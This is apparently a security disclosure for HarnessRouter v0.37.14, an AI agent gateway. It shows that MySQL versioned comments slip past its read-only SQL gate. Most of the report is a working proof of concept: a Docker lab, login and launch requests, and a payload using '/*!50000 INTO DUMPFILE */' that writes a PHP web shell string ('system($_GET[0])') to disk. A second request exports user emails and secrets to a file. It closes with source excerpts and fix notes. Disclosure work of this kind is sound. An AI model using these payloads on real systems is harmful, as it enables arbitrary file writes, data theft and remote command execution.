### Vulnerability details

**Official website / Product:** https://harnessrouter.ai / https://github.com/HarnessRouter/harnessrouter

**Repository:** HarnessRouter/harnessrouter (stars at selection: 3816)

**Vulnerability type:** SQLi (read-only SQL gate bypass → `INTO OUTFILE`/`INTO DUMPFILE` arbitrary file write → getshell when FILE + web path allow)

**Vulnerability versions:** Community Edition v0.37.14 (`HR_VERSION=0.37.14`; audited commit f6592b27e0d46478f895100a20827d60b538acf4)

**Vulnerability URL / Parameter:** `POST /v1/harnesses/{harness_id}/servers/{server_id}/query` (console BFF: `/api/harness/v1/harnesses/.../query`); JSON field `sql`

**Complex:** yes

### Verification procedure

1. Rebuild the lab (original `labs/harnessrouter-r18a6` was torn down after verify). In any directory write the compose + MySQL init below, then start:

```yaml
# docker-compose.yml
services:
  mysql:
    image: mysql:8.0
    container_name: hr-r18a6-mysql
    environment:
      MYSQL_ROOT_PASSWORD: rootpass
      MYSQL_DATABASE: analytics
    command: ["--secure-file-priv=/var/lib/mysql-files", "--default-authentication-plugin=mysql_native_password"]
    ports:
      - "19816:3306"
    volumes:
      - ./mysql-init:/docker-entrypoint-initdb.d:ro
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "127.0.0.1", "-uroot", "-prootpass"]
      interval: 5s
      timeout: 5s
      retries: 30

  harnessrouter:
    image: harnessrouter/harnessrouter:latest
    container_name: hr-r18a6
    depends_on:
      mysql:
        condition: service_healthy
    ports:
      - "19806:3000"
    environment:
      HR_AUTH_USER: harnessrouter
      HR_AUTH_PASSWORD: change-me-r18a6
      HR_BACKENDS: none
      HR_SECRET_KEY: r18a6-lab-secret-key-do-not-reuse
    volumes:
      - hr-r18a6-data:/data
    restart: unless-stopped

volumes:
  hr-r18a6-data:
```

```sql
-- mysql-init/01-analytics.sql
CREATE USER IF NOT EXISTS 'app'@'%' IDENTIFIED BY 'apppass';
GRANT SELECT, FILE ON *.* TO 'app'@'%';
GRANT ALL PRIVILEGES ON analytics.* TO 'app'@'%';
FLUSH PRIVILEGES;

USE analytics;
CREATE TABLE IF NOT EXISTS users (
  id INT PRIMARY KEY,
  email VARCHAR(255) NOT NULL,
  secret VARCHAR(255) NOT NULL
);
INSERT INTO users (id, email, secret) VALUES
  (1, 'alice@example.com', 'alice-secret'),
  (2, 'bob@example.com', 'bob-secret')
ON DUPLICATE KEY UPDATE email=VALUES(email), secret=VALUES(secret);
```

```bash
mkdir -p mysql-init
# place 01-analytics.sql as above
docker compose up -d
# wait healthy: 0.0.0.0:19806->3000/tcp ; mysql 19816->3306
# verified image id at audit: harnessrouter/harnessrouter:latest 4d8d20a780c4 (HR_VERSION=0.37.14)
```

2. Console self-host login → `hr_selfhost` cookie (replace cookie in later steps with the Set-Cookie value you receive):

```http
POST /api/selfhost/login HTTP/1.1
Host: 127.0.0.1:19806
Content-Type: application/json
Accept: application/json
Content-Length: 57
Connection: close

{"username":"harnessrouter","password":"change-me-r18a6"}
```

```http
HTTP/1.1 200 OK
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
content-type: application/json
set-cookie: hr_selfhost=v1.1794163834865.3b1ba90b2c0274853131f1113d09875b0aec2aa2adddc8c9b4e6898e524333fb; Path=/; Max-Age=604800; HttpOnly; SameSite=Lax
Date: Sun, 01 Nov 2026 18:50:34 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked

{"ok":true}
```

3. Launch the dashboard kit with the lab MySQL DSN (BFF → gateway). Response yields `harnessId` and hosted `mcp.database`:

```http
POST /api/harness/v1/kits/dashboard/launch HTTP/1.1
Host: 127.0.0.1:19806
Cookie: hr_selfhost=v1.1794163834865.3b1ba90b2c0274853131f1113d09875b0aec2aa2adddc8c9b4e6898e524333fb
Content-Type: application/json
Accept: application/json
Content-Length: 158
Connection: close

{"base":"claude-code","model":"claude-opus-5","database":{"engine":"mysql","connection_string":"mysql://app:apppass@mysql:3306/analytics","sample_rows":true}}
```

Lab response (truncated harness blob; critical fields kept): `harnessId=chrn_9b00fd3e2df5441d9a4dbf10e125f17c`, `mcpServers[0].id=mcp.database`, `created=true`. Optional connectivity check returned `{"ok":true,"engine":"mysql","host":"mysql:3306","database":"analytics","tableCount":1,"tables":["analytics.users"]}`.

4. Control: plain `SELECT … INTO OUTFILE …` is refused by `check_readonly` (`sql_refused` / INTO):

```http
POST /api/harness/v1/harnesses/chrn_9b00fd3e2df5441d9a4dbf10e125f17c/servers/mcp.database/query HTTP/1.1
Host: 127.0.0.1:19806
Cookie: hr_selfhost=v1.1794163834865.3b1ba90b2c0274853131f1113d09875b0aec2aa2adddc8c9b4e6898e524333fb
Content-Type: application/json
Accept: application/json
Content-Length: 122
Connection: close

{"sql": "SELECT email, secret INTO OUTFILE '/var/lib/mysql-files/hr-r18a6-plain.csv' FROM users LIMIT 10", "max_rows": 10}
```

```http
HTTP/1.1 400 Bad Request
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
content-length: 394
content-type: application/json
uhp-version: 2026-09-28
Date: Sun, 01 Nov 2026 18:51:06 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"error":{"type":"invalid_request_error","code":"sql_refused","message":"Only SELECT is allowed here, and this contains INTO. If that word is a column or table name, alias it — the check cannot tell them apart.","param":"sql","detail":null},"detail":"Only SELECT is allowed here, and this contains INTO. If that word is a column or table name, alias it — the check cannot tell them apart."}
```

5. Send the full PoC below (`/*!50000 INTO DUMPFILE … */`) → HTTP 200.

6. Impact:

```bash
docker exec hr-r18a6-mysql cat /var/lib/mysql-files/hr-r18a6-getshell.txt
# expected:
# RCE_PROOF_r18a6_<?php system($_GET[0]); ?>
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /api/harness/v1/harnesses/chrn_9b00fd3e2df5441d9a4dbf10e125f17c/servers/mcp.database/query HTTP/1.1
Host: 127.0.0.1:19806
Cookie: hr_selfhost=v1.1794163834865.3b1ba90b2c0274853131f1113d09875b0aec2aa2adddc8c9b4e6898e524333fb
Content-Type: application/json
Accept: application/json
User-Agent: hr-r18a6-poc/1.0
Content-Length: 157
Connection: close

{"sql": "SELECT 'RCE_PROOF_r18a6_<?php system($_GET[0]); ?>' /*!50000 INTO DUMPFILE '/var/lib/mysql-files/hr-r18a6-getshell.txt' */ LIMIT 1", "max_rows": 10}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
content-length: 77
content-type: application/json
uhp-version: 2026-09-28
Date: Sun, 01 Nov 2026 18:51:42 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"columns":[],"rows":[],"row_count":0,"truncated":false,"limit_applied":null}
```

Secondary write (table rows via versioned-comment `INTO OUTFILE`; same cookie/harness):

```http
POST /api/harness/v1/harnesses/chrn_9b00fd3e2df5441d9a4dbf10e125f17c/servers/mcp.database/query HTTP/1.1
Host: 127.0.0.1:19806
Cookie: hr_selfhost=v1.1794163834865.3b1ba90b2c0274853131f1113d09875b0aec2aa2adddc8c9b4e6898e524333fb
Content-Type: application/json
Accept: application/json
Content-Length: 132
Connection: close

{"sql": "SELECT email, secret /*!50000 INTO OUTFILE '/var/lib/mysql-files/hr-r18a6-pwn.csv' */ FROM users LIMIT 10", "max_rows": 10}
```

```http
HTTP/1.1 200 OK
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
content-length: 77
content-type: application/json
uhp-version: 2026-09-28
Date: Sun, 01 Nov 2026 18:51:42 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"columns":[],"rows":[],"row_count":0,"truncated":false,"limit_applied":null}
```

Verification result notes:

- HTTP 200 shows `check_readonly` did **not** refuse a statement that performs `INTO DUMPFILE` (keywords hidden inside a MySQL executable block comment for the scanner).
- MySQL file `/var/lib/mysql-files/hr-r18a6-getshell.txt` contains `RCE_PROOF_r18a6_<?php system($_GET[0]); ?>`.
- Also verified `SELECT email, secret /*!50000 INTO OUTFILE '…/hr-r18a6-pwn.csv' */ FROM users LIMIT 10` wrote table rows; plain `INTO OUTFILE` is refused (`sql_refused`).
- `SET SESSION TRANSACTION READ ONLY` does not block these filesystem writes.
- With `FILE` privilege and a writable web path under `secure_file_priv` (or empty priv), this becomes getshell; the lab proves arbitrary content write under the configured priv directory.
- Fresh-lab note: replace `hr_selfhost` and `harnessId` with values from steps 2–3; cookies expire after 7 days.

### Vulnerability analysis

HarnessRouter exposes a customer database to dashboard refresh and agents through a hosted MCP/`/query` path. `gateway/sql_plane.py` implements a documented read-only gate: strip comments/strings, forbid `INTO` and other write keywords.

The bug: `_strip()` removes all `/*…*/` comments (including MySQL executable comments `/*!50000 … */`) before keyword checks, but `check_readonly()` **returns the original raw SQL** to `aiomysql`. MySQL expands `/*!50000 INTO DUMPFILE 'path' */` into a real `INTO DUMPFILE`, writing attacker-controlled bytes on the database host even after `SET SESSION TRANSACTION READ ONLY`.

This is not intentional harness/agent shell execution; it bypasses a security control that claims to keep the connection read-only. Upstream unit tests even assert that keywords inside ordinary block comments must not trip the gate (`test_keyword_hidden_in_a_comment_does_not_sneak_through_or_falsely_trip`), without accounting for MySQL versioned/executable comments that are stripped for the scanner yet executed by the server.

### Trigger / sink source (full path and line numbers):

```python
# File: gateway/sql_plane.py
# Lines: 50-102 (audited commit f6592b27e0d46478f895100a20827d60b538acf4)
_LINE_COMMENT = re.compile(r"--[^\n]*")
_BLOCK_COMMENT = re.compile(r"/\*.*?\*/", re.S)
_STRING = re.compile(r"'(?:[^']|'')*'|\"(?:[^\"]|\"\")*\"|`[^`]*`")

_FORBIDDEN = (
    "insert", "update", "delete", "merge", "upsert", "replace",
    "drop", "create", "alter", "truncate", "rename", "comment",
    "grant", "revoke", "vacuum", "analyze", "reindex", "cluster",
    "copy", "call", "do", "execute", "prepare", "deallocate",
    "set", "reset", "begin", "commit", "rollback", "savepoint",
    "lock", "listen", "notify", "load", "handler", "attach", "detach",
    "into",            # SELECT … INTO creates a table
)

def _strip(sql: str) -> str:
    """Comments and string/identifier literals removed, so keyword matching cannot be fooled by a
    column called `update_time` or a literal 'please delete me'."""
    s = _BLOCK_COMMENT.sub(" ", sql)
    s = _LINE_COMMENT.sub(" ", s)
    s = _STRING.sub(" '' ", s)
    return s

def check_readonly(sql: str) -> str:
    """The statement, or SqlRefused naming what was wrong. Returns the trimmed statement."""
    raw = (sql or "").strip().rstrip(";").strip()
    if not raw:
        raise SqlRefused("The query is empty.")

    bare = _strip(raw)

    if ";" in bare.strip().rstrip(";"):
        raise SqlRefused("Send one statement at a time — this contains more than one.")

    words = re.findall(r"[a-zA-Z_][a-zA-Z0-9_]*", bare.lower())
    if not words:
        raise SqlRefused("This does not look like a SQL statement.")
    if words[0] not in ("select", "with"):
        raise SqlRefused(
            f"Only SELECT is allowed here; this starts with {words[0].upper()}. "
            "This connection is for reading data to chart it.")

    hit = next((w for w in words if w in _FORBIDDEN), None)
    if hit:
        raise SqlRefused(
            f"Only SELECT is allowed here, and this contains {hit.upper()}. "
            "If that word is a column or table name, alias it — the check cannot tell them apart.")
    return raw   # raw still contains /*!50000 INTO … */
```

```python
# File: gateway/sql_plane.py
# Lines: 227-255 (_mysql_query excerpt) and 296-307 (run_query)
async def _mysql_query(dsn: str, sql: str, timeout: float, max_rows: int) -> dict:
    try:
        import aiomysql
    except ModuleNotFoundError as e:
        raise SqlError("MySQL support is not installed in this build.") from e
    parsed = _parse_mysql_dsn(dsn)
    conn = None
    try:
        conn = await asyncio.wait_for(aiomysql.connect(**parsed), timeout=timeout)
        await _vet_peer(conn)
        cur = await conn.cursor(aiomysql.SSCursor)
        with_suppress = "SET SESSION TRANSACTION READ ONLY"
        try:
            await cur.execute(with_suppress)
        except Exception:
            pass

        async def first_rows():
            await cur.execute(sql)  # executes attacker raw SQL after gate
            return await cur.fetchmany(max_rows + 1)
        recs = await asyncio.wait_for(first_rows(), timeout=timeout)
        cols = [d[0] for d in (cur.description or [])]
        return _rows_out(cols, list(recs), max_rows)
    finally:
        if conn is not None:
            conn.close()

async def run_query(engine: str, dsn: str, sql: str, *, timeout: float = DEFAULT_TIMEOUT_S,
                    max_rows: int = DEFAULT_MAX_ROWS) -> dict:
    if engine not in ENGINES:
        raise SqlRefused(f"Unsupported database: {engine}. This build supports {', '.join(ENGINES)}.")
    checked = check_readonly(sql)
    capped, added = with_limit(checked, max_rows + 1)
    out = await (_pg_query if engine == "postgres" else _mysql_query)(dsn, capped, timeout, max_rows)
    out["limit_applied"] = added and max_rows or None
    return out
```

### Fix notes

1. Reject on the **raw** SQL: `INTO\s+(OUTFILE|DUMPFILE)`, `LOAD_FILE\s*(`, and MySQL executable comments `/\*!\d{5}`.
2. Do not strip all block comments before keyword checks while still executing the unstripped text; use a dialect-aware parser/AST.
3. Least privilege: no `FILE` on the kit DB account; tight `secure_file_priv`; SELECT-only grants.
4. Do not treat `SET SESSION TRANSACTION READ ONLY` as protection against OUTFILE/DUMPFILE.
